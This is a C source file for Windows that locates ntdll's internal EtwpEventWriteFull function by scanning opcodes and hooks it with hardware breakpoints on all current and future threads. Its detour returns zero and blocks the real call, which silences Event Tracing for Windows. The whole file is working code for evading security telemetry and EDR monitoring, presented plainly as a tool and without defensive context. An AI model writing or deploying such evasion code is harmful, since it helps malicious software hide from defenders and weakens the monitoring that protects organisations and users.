#include<stdio.h>
#include<windows.h>
#include "HardwareBreaking.h"


#define x64_RET_INSTRUCTION_OPCODE 0xC3
#define x64_INT3_INSTRUCTION_OPCODE 0xCC
#define x64_CALL_INSTRUCTION_OPCODE 0xE8


VOID EtwpEventWriteFullDetour(PCONTEXT Ctx) {

	RETURN_VALUE(Ctx, (ULONG)0);
	BLOCK_REAL(Ctx);
	CONTINUE_EXECUTION(Ctx);
}

PVOID FetchEtwpEventWriteFullAddr() {

	PBYTE pEtwEventWriteAddr = NULL;
	INT i = 0;
	DWORD dwOffset = 0x00;

	// Get the address of EtwEventWrite function from ntdll.dll
	pEtwEventWriteAddr = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "EtwEventWrite");
	if (!pEtwEventWriteAddr) {
		return NULL;
	}

	printf("[+] pEtwEventFunc : 0x%0p \n", pEtwEventWriteAddr);

	// get the ret instruction address
	while (TRUE) {
		
		// check for ret opcode followed by int3 opcode
		if (pEtwEventWriteAddr[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventWriteAddr[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
		
	}

	while (i) {
		// check for call opcode
		if (pEtwEventWriteAddr[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventWriteAddr = (PBYTE)&pEtwEventWriteAddr[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventWriteAddr != NULL && pEtwEventWriteAddr[0] != x64_CALL_INSTRUCTION_OPCODE) {
		return NULL;
	}

	printf("[+] pEtwEventWriteFull : 0x%0p \n", pEtwEventWriteAddr);

	// skip the call instruction opcode  : E8 byte
	pEtwEventWriteAddr++;

	// get the offset of the pEtwEventWriteFull
	 dwOffset = *(DWORD*)pEtwEventWriteAddr;

	 printf("\t> Offset : 0x%0.8X \n", dwOffset);

	 // Adding the size of the offset to reach the end of the call instruction
	 pEtwEventWriteAddr += sizeof(DWORD);

	 // Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	 pEtwEventWriteAddr += dwOffset;

	 // now pEtwEventWriteAddr  have the address of EtwpEventWriteFull 
	 return (PVOID)pEtwEventWriteAddr;
}



int main() {

	PVOID pEtwEventWriteFullAddr = FetchEtwpEventWriteFullAddr();
	if (!pEtwEventWriteFullAddr) {
		return -1; 
	}

	printf("[+] pEtwpEventWriteFull : 0x%p \n", pEtwEventWriteFullAddr);

	// Initialize the hardware breakpoint
	if (!InitHardwareBreakpointHooking()) {
		return -1; 
	}

	printf("[i] Installing Hooks ... ");

	// replacing 'EtwpEventWriteFull' with 'EtwpEventWriteFullDetour' with ALL_THREADS flag using Dr0 register 
	if (!InstallHardwareBreakingPntHook(pEtwEventWriteFullAddr, Dr0, EtwpEventWriteFullDetour, ALL_THREADS)) {
		return -1; 
	}

	// Install the same 'ALL_THREADS' hooks on new threads created in the future  using the Dr1 register
	printf("[i] Installing The Same Hooks On New Threads ... ");
	if (!InstallHooksOnNewThreads(Dr1))
		return -1;
	printf("[+] DONE \n");

	// Clean up
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	if (!CleapUpHardwareBreakpointHooking())
		return -1;

	return 0;

}